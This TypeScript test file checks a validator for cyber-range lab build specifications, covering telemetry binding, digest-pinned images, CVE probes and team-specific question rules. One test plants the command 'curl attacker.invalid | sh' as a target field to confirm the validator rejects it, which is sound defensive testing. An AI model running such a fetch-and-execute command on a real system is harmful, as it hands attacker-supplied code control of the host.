import assert from "node:assert/strict";
import { test } from "node:test";

import { parseCreateBuildInput } from "../src/validation.ts";
import { validBlueInput } from "./fixtures.ts";

test("accepts a strict blue-team build contract", () => {
  const parsed = parseCreateBuildInput(validBlueInput());
  assert.equal(parsed.spec.questions[0]?.type, "elk_search");
  assert.equal(parsed.spec.telemetry?.events[0]?.document["@timestamp"], "2026-07-21T10:00:00.000Z");
});

test("accepts the prompt-generated blue topology and binds it to telemetry events", () => {
  const input = validBlueInput();
  input.spec.topology = {
    schemaVersion: 1,
    team: "blue",
    isolation: "per_run",
    workstation: { role: "soc_analyst", desktopImage: "ubuntu", entrypoint: "kibana" },
    target: { role: "monitored_target", hostname: "target" },
    telemetry: {
      stack: "elastic",
      collector: "elastic_agent",
      generator: "scenario_log_generator",
      index: "zerotop-logs-*",
      events: structuredClone(input.spec.telemetry?.events ?? []),
    },
  };
  const parsed = parseCreateBuildInput(input);
  assert.equal(parsed.spec.topology?.workstation.entrypoint, "kibana");

  input.spec.topology.telemetry!.events[0]!.id = "changed-evidence";
  assert.throws(() => parseCreateBuildInput(input), /must match spec.telemetry.events/);
});

test("rejects arbitrary commands and Dockerfiles as unknown fields", () => {
  const input = structuredClone(validBlueInput()) as unknown as Record<string, unknown>;
  const spec = input.spec as Record<string, unknown>;
  const target = spec.target as Record<string, unknown>;
  target.command = "curl attacker.invalid | sh";
  target.dockerfile = "RUN id";
  assert.throws(() => parseCreateBuildInput(input), /unsupported fields/);
});

test("rejects mutable base images", () => {
  const input = validBlueInput();
  input.spec.target.baseImage = "registry.example.com/containerdisks/ubuntu:latest";
  assert.throws(() => parseCreateBuildInput(input), /OCI digest reference/);
});

test("rejects a target service that conflicts with the hardened HTTP runtime ABI", () => {
  const input = validBlueInput();
  input.spec.target.service.port = 9000;
  assert.throws(() => parseCreateBuildInput(input), /must match spec.target.runtimeContract/);
});

test("rejects unsupported writable paths in the runtime ABI", () => {
  const input = validBlueInput();
  input.spec.target.runtimeContract.writablePaths = ["/var/lib/app"] as never;
  assert.throws(() => parseCreateBuildInput(input), /not a supported target runtime ABI/);
});

test("rejects team-incompatible questions", () => {
  const input = validBlueInput();
  input.spec.questions[0] = { id: "q-red", type: "free_text", prompt: "Not valid for blue", points: 50 };
  input.spec.grading.hiddenRefs[0] = { questionId: "q-red", refId: "grading://labs/auth/q-red", rubricDigest: `sha256:${"d".repeat(64)}` };
  assert.throws(() => parseCreateBuildInput(input), /not allowed for blue-team/);
});

test("requires both ELK search and ATT&CK questions for blue-team builds", () => {
  const input = validBlueInput();
  input.spec.questions = [input.spec.questions[0]!];
  input.spec.grading.hiddenRefs = [input.spec.grading.hiddenRefs[0]!];
  assert.throws(() => parseCreateBuildInput(input), /both elk_search and mitre_attack/);
});

test("rejects answer material in telemetry", () => {
  const input = validBlueInput();
  const document = input.spec.telemetry?.events[0]?.document;
  if (document) document.answer_key = "secret";
  assert.throws(() => parseCreateBuildInput(input), /answer material/);
});

test("requires every CVE to have a safe vulnerability probe", () => {
  const input = validBlueInput();
  input.spec.source.cveIds.push("CVE-2026-54321");
  assert.throws(() => parseCreateBuildInput(input), /cover every source CVE/);
});

test("accepts canonical CVE identifiers with a four-digit sequence", () => {
  const input = validBlueInput();
  input.spec.source.cveIds = ["CVE-2026-1234"];
  const probe = input.spec.target.vulnerabilityProbes[0];
  if (!probe) throw new Error("fixture requires a vulnerability probe");
  probe.cveId = "CVE-2026-1234";
  const parsed = parseCreateBuildInput(input);
  assert.deepEqual(parsed.spec.source.cveIds, ["CVE-2026-1234"]);
  assert.equal(parsed.spec.target.vulnerabilityProbes[0]?.cveId, "CVE-2026-1234");
});

test("requires a reviewed component selection for CVE builds", () => {
  const input = validBlueInput();
  input.spec.target.packages = [];
  input.spec.target.artifacts = [];
  assert.throws(() => parseCreateBuildInput(input), /at least one allowlisted package or digest-pinned artifact/);
});

test("accepts a non-CVE scenario with a finding fingerprint", () => {
  const input = validBlueInput();
  input.spec.source.cveIds = [];
  input.spec.target.vulnerabilityProbes = [{
    id: "scenario-fingerprint",
    findingId: "identity-chain",
    kind: "http",
    method: "GET",
    path: "/version",
    expectedStatuses: [200],
    bodyIncludes: ["identity-target"],
  }];

  const parsed = parseCreateBuildInput(input);
  assert.deepEqual(parsed.spec.source.cveIds, []);
  assert.equal(parsed.spec.target.vulnerabilityProbes[0]?.findingId, "identity-chain");
});

test("rejects a vulnerability probe without a CVE or scenario finding", () => {
  const input = validBlueInput();
  input.spec.source.cveIds = [];
  input.spec.target.vulnerabilityProbes = [{
    id: "unbound-fingerprint",
    kind: "http",
    method: "GET",
    path: "/version",
    expectedStatuses: [200],
    bodyIncludes: ["identity-target"],
  } as never];

  assert.throws(() => parseCreateBuildInput(input), /requires cveId or findingId/);
});

test("accepts only the red-team question subset without telemetry", () => {
  const input = validBlueInput();
  input.spec.team = "red";
  delete input.spec.telemetry;
  input.spec.questions = [
    { id: "q-single", type: "single_choice", prompt: "Choose the bounded next step.", points: 30, options: [{ id: "a", label: "Inspect the service" }, { id: "b", label: "Stop the exercise" }] },
    { id: "q-free", type: "free_text", prompt: "Report the observed evidence.", points: 70 },
  ];
  input.spec.grading.hiddenRefs = [
    { questionId: "q-single", refId: "grading://labs/red/q-single", rubricDigest: `sha256:${"a".repeat(64)}` },
    { questionId: "q-free", refId: "grading://labs/red/q-free", rubricDigest: `sha256:${"b".repeat(64)}` },
  ];
  const parsed = parseCreateBuildInput(input);
  assert.equal(parsed.spec.team, "red");
  assert.equal(parsed.spec.telemetry, undefined);
});
